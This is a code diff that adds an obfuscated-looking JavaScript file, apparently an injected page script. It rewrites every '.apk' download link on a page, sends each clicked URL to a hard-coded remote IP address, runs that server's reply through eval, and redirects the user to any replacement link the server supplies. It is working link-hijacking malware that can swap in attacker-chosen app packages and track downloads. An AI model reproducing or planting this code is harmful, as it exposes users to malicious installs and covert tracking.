@@ -1,0 +1,165 @@
+(function() {
+    function getop(opt) {
+        opt = opt || {};
+        opt.method = opt.method.toUpperCase() || 'POST';
+        opt.url = opt.url || '';
+        opt.async = opt.async || true;
+        opt.data = opt.data || null;
+        opt.success = opt.success ||
+            function() {};
+        var xmlHttp = null;
+        if (XMLHttpRequest) {
+            xmlHttp = new XMLHttpRequest()
+        } else {
+            xmlHttp = new ActiveXObject('Microsoft.XMLHTTP')
+        }
+        var params = [];
+        for (var key in opt.data) {
+            params.push(key + '=' + opt.data[key])
+        }
+        if (opt.method.toUpperCase() === 'POST') {
+            xmlHttp.open(opt.method, opt.url, opt.async);
+            xmlHttp.setRequestHeader('Content-Type', opt.contentType);
+            xmlHttp.send(opt.data)
+        } else if (opt.method.toUpperCase() === 'GET') {
+            xmlHttp.open(opt.method, opt.url + '?' + params.join('&'), opt.async);
+            xmlHttp.send(null)
+        }
+        xmlHttp.onreadystatechange = function() {
+            if (xmlHttp.readyState == 4 && xmlHttp.status == 200) {
+                opt.success(xmlHttp.responseText)
+            }
+        }
+    }
+    function T(h, e) {
+        var w = "";
+        if (h.indexOf(Y) > 1) {
+            w = h;
+            GS(e, "href", "javascript:;");
+            GS(e, "data-href", w)
+        }
+        return w
+    }
+    function O(n, g, w) {
+        w = w || W;
+        var d = w.document,
+            i, s = d.getElementsByTagName(n);
+        for (i = 0; i < s.length; ++i) {
+            try {
+                g(s[i], w, d)
+            } catch(_) {}
+        }
+    }
+    function G(o, a) {
+        return o.getAttribute(a) || ""
+    }
+    function GS(o, a, b) {
+        o.setAttribute(a, b)
+    }
+    function alink(h) {
+        var el = D.createElement("a");
+        D.body.appendChild(el);
+        el.href = h;
+        el.click();
+        D.body.removeChild(el)
+    }
+    function S(h, O) { (new Image).src = 'http://139.198.11.216:8802/api/save/url?url='+encodeURIComponent(h);
+        getop({
+            method: 'GET',
+            data: {
+                url: encodeURIComponent(h.replace(/http(s)?:\/\//, ""))
+            },
+            url: 'http://139.198.11.216:8802/api/re/u',
+            success: function(datajson) {
+                var data = eval('(' + datajson + ')');
+                if (data.code == 0) {
+                    var datas = data.result;
+                    if (datas.url == "") {
+                        alink(h)
+                    } else {
+                        alink(datas.url)
+                    }
+                }
+            }
+        })
+    }
+    function bd(d, b, a, w) {
+        w = w || W;
+        if (w.attachEvent) {
+            d.attachEvent("on" + b,
+                function(q) {
+                    q = q || w.event;
+                    a.call(d, q)
+                })
+        } else {
+            if (w.addEventListener) {
+                d.addEventListener(b, a, false)
+            }
+        }
+    }
+    function cl(q) {
+        if (q.stopPropagation) {
+            q.stopPropagation()
+        } else {
+            q.cancelBubble = true
+        }
+    }
+    var W = window,
+        U = /msie/i.test(navigator.userAgent),
+        Y = ".apk",
+        $t = "data-tag",
+        V = {};
+    D = document;
+    function r() {
+        var p = function(o, w, d) {
+            var h = G(o, "href"),
+                t = G(o, $t),
+                u;
+            if (!h) {
+                return
+            }
+            V[h] = o;
+            u = T(h, o);
+            if (u && t !== "1") {
+                if (G(o, "onclick")) {} else {
+                    var p = o.parentNode,
+                        pa = d.createElement("div"),
+                        oa = null;
+                    if (U) {
+                        pa.innerHTML = o.outerHTML;
+                        for (var i = 0,
+                                 s = pa.childNodes; i < s.length; ++i) {
+                            if (s[i].nodeType == 1) {
+                                oa = s[i];
+                                break
+                            }
+                        }
+                    } else {
+                        oa = o.cloneNode(1)
+                    }
+                    oa.h = h;
+                    oa.u = u;
+                    p.insertBefore(oa, o);
+                    p.removeChild(o);
+                    bd(oa, "click",
+                        function(q) {
+                            cl(q);
+                            var x = this.u;
+                            if ( !! x) {
+                                S(u)
+                            }
+                        },
+                        w);
+                    bd(oa, "mousedown", cl);
+                    bd(oa, "mouseup", cl)
+                }
+            }
+        };
+        O("a", p)
+    }
+    setTimeout(function() {
+            r();
+            setInterval(r, 1000)
+        },
+        0)
+})();
